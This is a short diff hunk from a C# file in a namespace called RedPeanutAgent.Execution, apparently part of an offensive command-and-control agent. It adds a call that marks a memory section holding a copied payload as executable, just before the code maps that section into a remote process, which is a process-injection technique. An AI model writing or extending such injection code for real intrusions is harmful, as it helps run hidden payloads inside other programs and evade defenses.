@@ -221,6 +221,8 @@ namespace RedPeanutAgent.Execution
             //Copy payload to current process section
             Marshal.Copy(payload, 0, baseAddr, payload.Length);
 
+            Core.Natives.VirtualProtectEx(Core.Natives.GetCurrentProcess(), baseAddr, viewSize, Core.Natives.PAGE_EXECUTE_READ, out uint oldprotect);
+
             //Map remote section
             IntPtr baseAddrEx = IntPtr.Zero;
             IntPtr viewSizeEx = (IntPtr)size;
